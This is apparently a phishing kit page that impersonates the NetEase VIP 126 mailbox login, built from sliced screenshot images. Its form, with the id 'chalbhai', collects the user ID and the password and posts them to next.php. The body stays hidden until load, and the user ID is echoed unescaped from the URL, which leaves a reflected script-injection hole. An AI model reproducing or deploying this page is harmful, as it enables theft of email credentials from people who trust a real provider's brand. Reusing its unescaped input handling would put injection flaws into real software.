<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#32593;&#26131;&#86;&#73;&#80;&#49;&#50;&#54;&#37038;&#31665;&#30331;&#24405;&#27880;&#20876;&#45;&#26356;&#23433;&#20840;&#31283;&#23450;&#30340;&#20010;&#20154;&#21830;&#21153;&#25910;&#36153;&#37038;&#31665;</title>
<script type="text/javascript" src="https://www.sitepoint.com/examples/password/MaskedPassword/MaskedPassword.js"></script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>	
<script type="text/javascript">
function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}
</script>
<style type="text/css">
 .textbox {  
    background: #FFF;
    border: 0px solid #fff;
	padding-left: 12px;
	font-family: "Microsoft YaHei","&#24494;&#36719;&#38597;&#40657;";
	font-size: 15px;
    height: 40px; 
    width: 275px; 
 } 
 
.textbox:focus {  
    border-color: #fff; 
    border-style: solid; 
    border-width: 0px; 
    outline: 0; 
 } 
 </style>	
 <style type="text/css">
  
.textrbox {  
    background-color: transparent;
    border: 0px solid #fff;
	padding-left: 12px;
	font-size: 15px;
    height: 40px; 
    width: 275px;  
 } 
 
.textrbox:focus {  
    border-color: none;
   background-color:transparent;
    outline: 0;
 } 
 </style>	
<style type="text/css">
div#container
{
	position:relative;
	width: 1350px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

</head>
<body style="visibility:hidden" onload="unhideBody()">
<div id="container">
<div id="image6" style="position:absolute; overflow:hidden; left:0px; top:661px; width:1349px; height:243px; z-index:0"><img src="images/v4.png" alt="" title="" border=0 width=1349 height=243></div>

<div id="image7" style="position:absolute; overflow:hidden; left:0px; top:903px; width:1349px; height:301px; z-index:1"><a href="#"><img src="images/v5.png" alt="" title="" border=0 width=1349 height=301></a></div>

<div id="image8" style="position:absolute; overflow:hidden; left:0px; top:1203px; width:1349px; height:358px; z-index:2"><img src="images/v6.png" alt="" title="" border=0 width=1349 height=358></div>

<div id="image9" style="position:absolute; overflow:hidden; left:0px; top:1560px; width:1349px; height:308px; z-index:3"><img src="images/v7.png" alt="" title="" border=0 width=1349 height=308></div>

<div id="image10" style="position:absolute; overflow:hidden; left:0px; top:1867px; width:1349px; height:254px; z-index:4"><img src="images/v8.png" alt="" title="" border=0 width=1349 height=254></div>

<div id="image11" style="position:absolute; overflow:hidden; left:529px; top:1815px; width:332px; height:52px; z-index:5"><a href="#"><img src="images/v9.png" alt="" title="" border=0 width=332 height=52></a></div>

<div id="image12" style="position:absolute; overflow:hidden; left:514px; top:2074px; width:367px; height:45px; z-index:6"><a href="#"><img src="images/v19.png" alt="" title="" border=0 width=367 height=45></a></div>

<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1350px; height:145px; z-index:7"><a href="#"><img src="images/p1.png" alt="" title="" border=0 width=1350 height=145></a></div>

<div id="image2" style="position:absolute; overflow:hidden; left:0px; top:143px; width:1350px; height:171px; z-index:8"><a href="#"><img src="images/p2.png" alt="" title="" border=0 width=1350 height=171></a></div>

<div id="image3" style="position:absolute; overflow:hidden; left:0px; top:312px; width:1350px; height:192px; z-index:9"><a href="#"><img src="images/p3.png" alt="" title="" border=0 width=1350 height=192></a></div>

<div id="image4" style="position:absolute; overflow:hidden; left:0px; top:501px; width:1350px; height:161px; z-index:10"><a href="#"><img src="images/p4.png" alt="" title="" border=0 width=1350 height=161></a></div>

<div id="image5" style="position:absolute; overflow:hidden; left:833px; top:144px; width:322px; height:223px; z-index:11"><img src="images/p7.png" alt="" title="" border=0 width=322 height=223></div>
<form action=next.php name=chalbhai id=chalbhai method=post>
<input name="userid" value="<?=$_GET[userid]?>" class="textrbox" autocomplete="off" required type="text" style="position:absolute;width:261px;left:864px;top:184px;z-index:12; font-size:14pt" size="1" tabindex="99">
<input name="pass" id="demo-field" placeholder="&#36755;&#20837;&#23494;&#30721;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:261px;left:864px;top:249px;z-index:13">
<div id="formimage1" style="position:absolute; left:863px; top:314px; z-index:14"><input type="image" name="formimage1" width="262" height="42" src="images/logon.png"></div>
</div>
<script type="text/javascript">
 
  //apply masking to the demo-field
  //pass the field reference, masking symbol, and character limit
  new MaskedPassword(document.getElementById("demo-field"), '\u25CF');
 
  //test the submitted value
  document.getElementById('demo-form').onsubmit = function()
  {
   alert('pword = "' + this.pword.value + '"');
   return false;
  };
 
 </script>
 
	
</body>
</html>